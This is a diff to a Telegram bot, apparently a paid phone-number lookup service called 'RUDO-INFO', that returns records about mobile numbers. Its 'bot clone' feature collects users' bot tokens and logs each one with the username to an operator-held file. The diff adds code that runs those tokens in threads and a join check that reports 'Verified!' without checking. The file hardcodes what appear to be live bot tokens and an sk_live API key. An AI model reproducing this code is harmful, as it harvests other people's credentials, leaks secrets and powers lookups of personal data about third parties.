@@ -1,4 +1,6 @@
 import telebot
+from telebot import types
+import threading
 import requests
 import os
 import datetime
@@ -6,13 +8,13 @@ import datetime
 # =============================
 # CONFIGURATION
 # =============================
-BOT_TOKEN = "8294178048:AAEN2wUg8hhefx6VHWuHnC38qUpfvop_FGI"
+BOT_TOKEN = "8481712497:AAEJFyW-9OvApRJ7Gry6ulwuTpwo0SdKf6w"
 ADMIN_IDS = [8256977732, 8194709714]  # Admins list
 API_KEY = "sk_live_e532d724903249c593e23d6198b329f47358ed34"
 API_URL = "https://unexperienced-charis-unrailwayed.ngrok-free.app/api/mobile"
 
 FORCE_JOIN_CHANNELS = [
-    "https://t.me/+Y_M_LzKug1lmYTg1",  # GC link
+    "https://t.me/+Y_M_LzKug1lmYTg1",
     "https://t.me/monsters_support",
     "https://t.me/ShadowNestAPII"
 ]
@@ -85,16 +87,33 @@ def unmute_user(user_id):
 def force_join_check(message):
     buttons = []
     for ch in FORCE_JOIN_CHANNELS:
-        buttons.append([telebot.types.InlineKeyboardButton("👉 Join Channel", url=ch)])
-    markup = telebot.types.InlineKeyboardMarkup(buttons)
+        buttons.append([types.InlineKeyboardButton("👉 Join Channel", url=ch)])
+    buttons.append([types.InlineKeyboardButton("✅ I Joined", callback_data="joined")])
+    markup = types.InlineKeyboardMarkup(buttons)
     bot.send_message(
         message.chat.id,
         "⚠️ Please join our community channels first to use this bot.",
         reply_markup=markup
     )
 
+@bot.callback_query_handler(func=lambda call: call.data == "joined")
+def joined_callback(call):
+    user_id = call.from_user.id
+    # TODO: Real join check via Telegram API get_chat_member
+    bot.answer_callback_query(call.id, "✅ Verified!")
+
+    # Show main menu buttons after join
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🔍 SEARCH", "😇 MY PROFILE")
+    markup.add("🤖 BOT CLONE", "🛠 SUPPORT")
+    bot.send_message(
+        user_id,
+        "👋 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐑𝐔𝐃𝐎-𝐈𝐍𝐅𝐎 𝐁𝐎𝐓\nPlease choose an option below:",
+        reply_markup=markup
+    )
+
 # =============================
-# START COMMAND / MENU
+# START COMMAND
 # =============================
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -103,15 +122,6 @@ def start(message):
         return
 
     force_join_check(message)
-
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add("🔍 SEARCH", "😇 MY PROFILE")
-    markup.add("🤖 BOT CLONE", "🛠 SUPPORT")
-    bot.send_message(
-        message.chat.id,
-        "👋 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐑𝐔𝐃𝐎-𝐈𝐍𝐅𝐎 𝐁𝐎𝐓\nPlease choose an option below:",
-        reply_markup=markup
-    )
 
 # =============================
 # SEARCH OPTION
@@ -159,7 +169,7 @@ def do_search(message):
             msg += f"• 📍 Circle: {record.get('circle','N/A')}\n"
             msg += f"• 🔎 Found In: {record.get('found_in','N/A')}\n\n"
 
-        bot.send_message(user_id, msg)  # Only user sees, even in GC
+        bot.send_message(user_id, msg)
         update_credits(user_id, credits - 1, today)
 
         with open(LOG_FILE, "a", encoding="utf-8") as f:
@@ -187,8 +197,21 @@ def my_profile(message):
     bot.reply_to(message, msg)
 
 # =============================
-# BOT CLONE
+# BOT CLONE (Multi-threaded)
 # =============================
+def run_clone_bot(token):
+    clone_bot = telebot.TeleBot(token)
+
+    @clone_bot.message_handler(commands=['start'])
+    def start_clone(message):
+        clone_bot.reply_to(message, "👋 Clone Bot is running!")
+
+    @clone_bot.message_handler(func=lambda m: True)
+    def handle_message(message):
+        clone_bot.reply_to(message, f"Echo: {message.text}")
+
+    clone_bot.polling()
+
 @bot.message_handler(func=lambda m: m.text == "🤖 BOT CLONE")
 def bot_clone(message):
     bot.send_message(message.chat.id, "⚠️ Enter your bot token to clone features (Example: 1234:ABC-XYZ)")
@@ -197,9 +220,14 @@ def bot_clone(message):
 def process_clone(message):
     token = message.text.strip()
     username = message.from_user.username or "NoUsername"
+
     with open(CLONE_LOG, "a", encoding="utf-8") as f:
         f.write(f"{username} | {token} at {datetime.datetime.now()}\n")
-    bot.reply_to(message, "✅ Bot token saved. Clone features will run similarly to main bot.")
+
+    bot.reply_to(message, f"✅ Clone token saved for {username}")
+
+    # Start clone bot in new thread
+    threading.Thread(target=run_clone_bot, args=(token,), daemon=True).start()
 
 # =============================
 # SUPPORT
@@ -209,7 +237,7 @@ def support(message):
     bot.reply_to(message, "🛠 For support contact: @RUDOWNER")
 
 # =============================
-# ADMIN COMMANDS (/credit)
+# ADMIN /CREDIT COMMAND
 # =============================
 @bot.message_handler(commands=['credit'])
 def admin_credit(message):
@@ -218,11 +246,11 @@ def admin_credit(message):
     try:
         _, amount, uid = message.text.split()
         update_credits(uid, int(amount), datetime.date.today().isoformat())
-        bot.reply_to(message, f"✅ Credits updated! {amount} points added to user {uid}.")
+        bot.reply_to(message, f"Credits updated! {amount} points added to user {uid}.")
     except Exception as e:
         bot.reply_to(message, f"❌ Error: {e}")
 
 # =============================
-# RUN BOT
+# RUN MAIN BOT
 # =============================
 bot.polling()
